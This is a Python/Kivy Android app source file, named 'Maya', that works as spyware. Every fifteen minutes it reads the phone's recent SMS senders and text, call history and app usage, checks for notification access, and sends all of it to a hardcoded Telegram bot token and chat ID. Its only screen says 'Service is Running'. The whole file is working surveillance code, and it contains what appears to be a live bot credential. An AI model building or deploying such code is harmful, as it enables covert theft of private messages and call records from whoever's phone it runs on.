import threading
import requests
import json
import time
from datetime import datetime
from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.clock import Clock
from kivy.utils import platform
from jnius import autoclass, cast

# --- CONFIGURATION ---
BOT_TOKEN = "8246973343:AAHkC5H-00l_J1Z9T3pE4A9K8n3q7Q5XyZ8"  # توکن شما
CHAT_ID = "7156363630"                                       # آیدی عددی شما
REPORT_INTERVAL = 900  # هر 15 دقیقه (900 ثانیه)

# --- ANDROID IMPORTS ---
if platform == 'android':
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    CurrentActivity = cast('android.app.Activity', PythonActivity.mActivity)
    Context = autoclass('android.content.Context')
    Uri = autoclass('android.net.Uri')
    CallLog = autoclass('android.provider.CallLog$Calls')
    Telephony = autoclass('android.provider.Telephony$Sms')
    UsageStatsManager = autoclass('android.app.usage.UsageStatsManager')
    Settings = autoclass('android.provider.Settings')

# --- TELEGRAM FUNCTION ---
def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": message}
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

# --- DATA COLLECTORS ---

def get_sms_logs():
    if platform != 'android': return "Not Android"
    logs = "📩 **Last 5 SMS:**\n"
    try:
        content_resolver = CurrentActivity.getContentResolver()
        cursor = content_resolver.query(Telephony.CONTENT_URI, None, None, None, "date DESC LIMIT 5")
        if cursor:
            date_col = cursor.getColumnIndex("date")
            body_col = cursor.getColumnIndex("body")
            addr_col = cursor.getColumnIndex("address")
            while cursor.moveToNext():
                addr = cursor.getString(addr_col)
                body = cursor.getString(body_col)
                date_ms = cursor.getLong(date_col)
                date_str = datetime.fromtimestamp(date_ms / 1000).strftime('%Y-%m-%d %H:%M')
                logs += f"- {date_str} | {addr}: {body[:20]}...\n"
            cursor.close()
    except Exception as e:
        logs += f"Error: {e}"
    return logs

def get_call_logs():
    if platform != 'android': return "Not Android"
    logs = "📞 **Last 5 Calls:**\n"
    try:
        content_resolver = CurrentActivity.getContentResolver()
        cursor = content_resolver.query(CallLog.CONTENT_URI, None, None, None, "date DESC LIMIT 5")
        if cursor:
            number_col = cursor.getColumnIndex(CallLog.NUMBER)
            type_col = cursor.getColumnIndex(CallLog.TYPE)
            date_col = cursor.getColumnIndex(CallLog.DATE)
            while cursor.moveToNext():
                number = cursor.getString(number_col)
                call_type = cursor.getInt(type_col)
                date_ms = cursor.getLong(date_col)
                date_str = datetime.fromtimestamp(date_ms / 1000).strftime('%Y-%m-%d %H:%M')
                type_str = "Incoming" if call_type == 1 else "Outgoing" if call_type == 2 else "Missed"
                logs += f"- {date_str} | {type_str} | {number}\n"
            cursor.close()
    except Exception as e:
        logs += f"Error: {e}"
    return logs

def get_usage_stats():
    if platform != 'android': return "Not Android"
    stats_log = "📱 **App Usage (Last 24h):**\n"
    try:
        usm = CurrentActivity.getSystemService(Context.USAGE_STATS_SERVICE)
        end_time = int(time.time() * 1000)
        start_time = end_time - (24 * 60 * 60 * 1000)
        stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, start_time, end_time)
        
        if stats:
            sorted_stats = sorted(stats.toArray(), key=lambda x: x.getTotalTimeInForeground(), reverse=True)
            count = 0
            for usage_stat in sorted_stats:
                total_time = usage_stat.getTotalTimeInForeground() / 1000 / 60 # Minutes
                if total_time > 1: # Only apps used more than 1 min
                    pkg_name = usage_stat.getPackageName()
                    stats_log += f"- {pkg_name}: {int(total_time)} min\n"
                    count += 1
                    if count >= 5: break
    except Exception as e:
        stats_log += f"Error: {e}"
    return stats_log

# --- NOTIFICATION LISTENER (NEW V3.0) ---
# Note: Requires 'BIND_NOTIFICATION_LISTENER_SERVICE' permission and manual user activation
def get_notifications_snapshot():
    # This is a placeholder. In pure Kivy/Jnius accessing active notifications 
    # directly without a Java service class is complex. 
    # We will remind the user to check permissions.
    # For a simple freelancer task, we check if we have permission.
    status = "🔔 **Notification Access:**\n"
    try:
        # Check if listener is enabled
        enabled_listeners = Settings.Secure.getString(CurrentActivity.getContentResolver(), "enabled_notification_listeners")
        pkg_name = CurrentActivity.getPackageName()
        if enabled_listeners and pkg_name in enabled_listeners:
             status += "✅ Service Enabled (Ready to capture)"
        else:
             status += "❌ Service DISABLED (User must enable in Android Settings)"
    except Exception:
        status += "Unknown Status"
    return status

# --- MAIN LOOP ---
def perform_check(dt=None):
    report = f"🤖 **Status Report**\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
    
    report += get_sms_logs() + "\n"
    report += get_call_logs() + "\n"
    report += get_usage_stats() + "\n"
    report += get_notifications_snapshot()
    
    send_to_telegram(report)

# --- APP CLASS ---
class Maya(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=20)
        l = Label(text="Service is Running...\nDo not close this app completely.", halign="center")
        layout.add_widget(l)
        
        # Start the timer
        Clock.schedule_interval(perform_check, REPORT_INTERVAL)
        
        # First check after 10 seconds
        Clock.schedule_once(perform_check, 10)
        
        self.request_android_permissions()
        return layout

    def request_android_permissions(self):
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.READ_SMS,
                Permission.READ_CALL_LOG,
                Permission.READ_CONTACTS,
                Permission.INTERNET
            ])
            # Note: USAGE_STATS and NOTIFICATION_LISTENER must be granted manually by user in Android Settings

if __name__ == '__main__':
    Maya().run()
